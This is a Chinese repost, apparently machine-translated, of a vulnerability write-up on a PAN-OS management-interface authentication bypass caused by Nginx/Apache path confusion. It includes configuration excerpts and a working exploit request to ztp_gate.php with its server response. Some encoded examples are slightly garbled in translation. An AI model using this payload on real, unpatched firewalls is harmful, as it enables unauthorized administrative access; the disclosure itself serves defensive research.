---
title: PAN-OS 中 Nginx/Apache 路径混淆导致身份验证绕过
url: https://mp.weixin.qq.com/s/jZvvBfd6ua0INQY8W2QESw
source: Doonsec's feed
date: 2026-03-30
fetch_date: 2026-03-31T04:32:24.107147
---

# PAN-OS 中 Nginx/Apache 路径混淆导致身份验证绕过

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0HADFSJrag4o5fUdbialYEYvaANhyic406slSKPicLciaibWMFJLdV9ehUJPBibefMaq6Rb4ooWwTqgibOTaJFwx9PpHg4ibRRNIcD8ZFg/0?wx_fmt=jpeg)

# PAN-OS 中 Nginx/Apache 路径混淆导致身份验证绕过

Ots安全

![]()

在小说阅读器中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

几个月前，帕洛阿尔托防火墙中被曝存在 CVE-2024-0012 和 CVE-2024-9474 漏洞，且正被积极利用。据描述，该漏洞结合了身份验证绕过和命令执行功能，成功利用该漏洞可获取受影响设备的 root 权限。

在 Assetnote，我们不仅编写了漏洞检查程序，还研究了补丁的工作原理。这是我们的标准做法，以便我们能够主动为客户提供支持。

随着我们对管理界面架构的深入研究，我们怀疑即使在打完补丁之后，仍然存在一些问题。本文将讲述我们如何发现 PAN-OS 管理界面中的零日身份验证绕过漏洞。

与以往一样，漏洞披露后，Assetnote 会立即通过我们的攻击面管理平台通知客户新发现的漏洞。我们与客户紧密合作，迅速缓解漏洞，防止任何实际攻击。Assetnote 的研究团队将继续开展原创安全研究，及时向客户通报其攻击面中的零日漏洞。

为什么说这可疑？

为了了解为什么这种架构令人怀疑，让我们来看看身份验证是如何实现的。

您对管理界面的 Web 请求由三个独立的组件处理：Nginx、Apache 和 PHP 应用程序本身。首先，您的 Web 请求会到达 Nginx 反向代理。如果您的请求端口表明其目标是管理界面，PAN-OS 会设置一系列标头：

```
proxy_set_header X-Real-IP "";
proxy_set_header X-Real-Scheme "";
proxy_set_header X-Real-Port "";
proxy_set_header X-Real-Server-IP "";
proxy_set_header X-Forwarded-For "";
proxy_set_header X-pan-ndpp-mode "";
proxy_set_header Proxy "";
proxy_set_header X-pan-AuthCheck 'on';
```

其中最重要的是（正如您可能猜到的）X-pan-AuthCheck: on，它指示下游服务器我们需要进行身份验证。然后，Nginx 配置会进行一系列位置检查，并有选择地将身份验证检查设置为关闭：

```
if ($uri~ ^\/unauth\/.+$) {
  set$panAuthCheck'off';
}

if ($uri = /php/logout.php) {
  set$panAuthCheck'off';
}

# ...
```

这意味着（例如），如果我们传递/unauth/foo/bar/baz，我们将有X-pan-AuthCheck: off偏移量，这向下游表明我们不应该要求身份验证。

然后，该请求会被代理到 Apache 服务器。Apache 服务器将重新规范化并重新处理该请求，如果匹配到重写规则，还会应用该规则：

```
<Location "/">
    # Turns off DirectorySlash as it uses input host in redirect thus a vulnerability.
    # Have not found a way to fix that.
    DirectorySlashoff
    RewriteEngineon
    RewriteRule ^(.*)(\/PAN_help\/)(.*)\.(css|js|html|htm)$ $1$2$3.$4.gz [QSA,L]
    AddEncoding gzip .gz

    Options Indexes FollowSymLinks
    Requireall granted
</Location>
```

如果请求的文件是 PHP 文件，Apache 将通过mod\_php FCGI传递请求，该模块会根据标头强制执行身份验证：

```
if (
    $_SERVER['HTTP_X_PAN_AUTHCHECK'] != 'off'
    && $_SERVER['PHP_SELF'] !== '/CA/ocsp'
    && $_SERVER['PHP_SELF'] !== '/php/login.php'
    && stristr($_SERVER['REMOTE_HOST'], '127.0.0.1') === false
) {
    // ... check authentication ...
}
```

那么，这有什么可疑之处呢？我们的身份验证设置在 Nginx 层，并且基于 HTTP 标头，而这些标头几乎可以随意设置。之后，我们的请求会在 Apache 中再次被处理，而 Apache 对路径或标头的处理方式可能与 Nginx 不同！只有经过 Apache 处理后，请求才会传递给 PHP。如果 Nginx 和 Apache 对请求的理解存在差异，我们就有可能绕过身份验证。而事实证明，Apache 的路径处理行为确实有些奇怪。

Apache 的异常行为

如果您一直关注Orange 对 Apache 的最新研究，您可能会对上述RewriteRule感到怀疑：

```
<Location "/">
# ...
RewriteRule ^(.*)(\/PAN_help\/)(.*)\.(css|js|html|htm)$ $1$2$3.$4.gz [QSA,L]
# ...
</Location>
```

然而，由于这条 RewriteRule 位于 location 块中，因此重写操作发生在所谓的“按目录”上下文中，这可以抵御博文中提到的大部分攻击。不过，Apache 在处理这条RewriteRule时仍然存在一些有趣的实现细节。为了更好地解释这一点，我们来看一个简化的配置：

```
<Location "/">
RewriteEngineOn
RewriteRule (.*)\.abc$ $1 [L]
</Location>
```

这条规则会移除请求末尾的.abc扩展名，因此/foo/hello.html和/foo/hello.html.abc最终请求的是同一个文件。如果我们向/foo/hello.html.abc发送请求，则按顺序发生以下情况：

- mod\_rewrite获取到请求的文件为foo/hello.html.abc，并根据重写规则对其进行测试。

由于规则匹配，mod\_rewrite会进行替换，最终生成foo/hello.html文件。

- mod\_rewrite然后添加一个斜杠作为前缀，得到 /foo/hello.html，并进行“内部重定向”——这涉及到从头开始重新处理请求，就像用户直接请求/foo/hello.html一样。

Apache 通过内部重定向来实现基于目录的重写规则，这会带来一些有趣的后果，但这些后果并没有得到充分的文档说明。例如，在原始请求处理过程中设置的环境变量会被丢弃。对我们而言至关重要的是，由于请求被处理了两次，另一个后果是 URL 会被解码两次。任何信息安全专业人员都了解 URL 编码——如果我们请求以下任一内容：

```
/foo/hello.html
/foo/hello%25html
```

由于请求在处理前已进行 URL 解码，因此我们可以看到/foo/hello.html的内容。但是，如果我们进行两次编码并请求/foo/hello%252ehtml，则会收到 404 错误。这是因为 Apache 只会解码一次 URL，而hello%25html文件并不存在。然而，如果我们请求/foo/hello%252ehtml.abc，实际上可以看到hello.html的内容！URL 被解码了两次：一次是在初始请求中，一次是在内部重定向中。如果多次应用此规则，情况会变得更加复杂；例如，像/foo/hello%25252ehtml.abc.abc这样的请求会导致 URL 被解码三次，以此类推。

The Bug

让我们回到 PAN-OS，并考虑以下 URL：

```
/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css
```

Nginx 会对此 URL 进行一次解码，得到/unauth/%2e%2e/php/ztp\_gate.php/PAN\_help/x.css，并判断路径无需规范化，因为其中没有..序列。然后 Nginx 会将此$uri与路径进行比对，发现它命中了以下代码块：

```
if ($uri~ ^\/unauth\/.+$) { set$panAuthCheck'off';}
```

由于 Nginx 认为我们位于未授权目录中，它会将X-pan-AuthCheck标头设置为off，并将请求代理到 Apache。Apache 将再次收到完整的 URL：

```
/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css
```

Apache 还会对此进行一次 URL 解码：

```
/unauth/2e%2e/php/ztp_gate.php/PAN_help/x.css
```

Apache 也认为它不需要任何规范化。但是，它会发现它符合指定的RewriteRule：

```
RewriteRule ^(.*)(\/PAN_help\/)(.*)\.(css|js|html|htm)$$1$2$3.$4.gz [QSA,L]
```

所以它会将 URL 重写为：

```
/unauth/%2e%2e/php/ztp_gate.php/PAN_help/x.css.gz
```

Apache 随后发出内部重定向，这意味着请求将被重新处理。Apache 再次收到请求，但这一次，解码后的路径 URL 如下所示：

```
/unauth/../php/ztp_gate.php/PAN_help/x.css.gz
```

这是一个目录遍历，我们需要对其进行规范化！因此，Apache 在内部重写了 URL 以解决遍历问题，现在 URL 看起来像这样，它将通过mod\_php传递给 PHP 的 FCGI 。

```
/php/ztp_gate.php/PAN_help/x.css.gz
```

mod\_php检测到这看起来像是对路径SCRIPT\_FILENAME=/php/ztp\_gate.php的请求，后面还带有一些路径信息 ( PATH\_INFO=/PAN\_help/x.css.gz )，因此它会执行/php/ztp\_gate.php。由于Nginx 已将X-pan-AuthCheck标头设置为关闭，因此无需身份验证！

![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0G3MPWsYjDKzTEe5fdSpn8QMoE3TdxDyWjJy7jfMjE23JQKictZVXsnNBsGpyA9gJS7dxv6YcT5tlQxUL4SEiapapPgIk93N0d1s/640?wx_fmt=png&from=appmsg)

这导致 PAN-OS 管理界面中的身份验证完全绕过。

```
GET/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1
Host: my.testing.environment
Connection: close

...

HTTP/1.1 200 OK
Date: Mon, 02 Dec 2024 02:34:21 GMT
Content-Type: text/html; charset=UTF-8
Connection: close

<html>
<head>
    <title>Zero Touch Provisioning</title>
    <metahttp-equiv="Content-Type"content="text/html; charset=utf-8">
    <scripttype="text/javascript">
        window.Pan = window.Pan || {}; window.Pan.st = { st: {}};
        ...
```

结论

在这篇博文中，我们探讨了一种可疑（且相当常见）的架构：身份验证在代理端强制执行，但请求随后会经过行为不同的第二层。从根本上讲，这类架构会导致诸如头部走私和路径混乱之类的问题，从而引发许多影响深远的漏洞！

此问题已在 PAN-OS 10.2.14、PAN-OS 11.0.7、PAN-OS 11.2.5 及所有后续 PAN-OS 版本中修复。内部编号为 PAN-273971。Palo Alto Networks 建议在管理界面中将 IP 地址加入白名单，以防止此类漏洞或类似漏洞通过互联网被利用。

**END**

![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0FnUIsdT7kk6qIFmIqkxHWeoYNBfHwW7RRzOsCA7LKEY1A2UrdKkWIicef76NyT9EPTgFm5uLY0pAib0R9RLibCMVN1ay27zuPmmU/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址

排版 编辑 | Ots 小安

采集 翻译 | Ots Ai牛马

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

Ots安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过